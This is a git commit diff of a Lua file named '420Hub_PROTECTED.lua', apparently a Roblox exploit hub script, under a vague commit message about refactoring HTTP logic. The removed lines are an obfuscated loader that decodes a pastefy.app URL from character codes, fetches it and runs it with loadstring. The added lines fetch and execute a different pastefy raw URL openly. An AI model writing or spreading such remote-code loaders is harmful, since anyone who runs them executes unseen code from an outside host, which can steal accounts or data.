8cddf028d3afac0219fccc2901ad1cebd353a0fe
Hi <fbjz5k8t5h@privaterelay.appleid.com>
2026-01-22 02:03:51 -0600

    Update HTTP request logic and script execution
    Refactor HTTP request handling and loading of external script.

--- 420Hub_PROTECTED.lua
+++ 420Hub_PROTECTED.lua
@@ -1,20 +1,5 @@
-local a=game
-local b=a.GetService
-local c=b(a,"HttpService")
-local d=string.char
-local e=pcall
-local f=loadstring or load
-
-local g={104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,90,110,109,116,55,52,98,117,47,114,97,119}
-local h=""
-for i=1,#g do h=h..d(g[i]) end
-
-local i,j=e(function()
-    return a:HttpGet(h)
-end)
-
-if not i or not j then return end
-
-local k,l=f(j)
-if not k then return end
-k()
+local src = game:HttpGet("https://pastefy.app/LZGBsGJK/raw?part=addon.lua")
+local run = loadstring(src)
+if run then
+    run()
+end
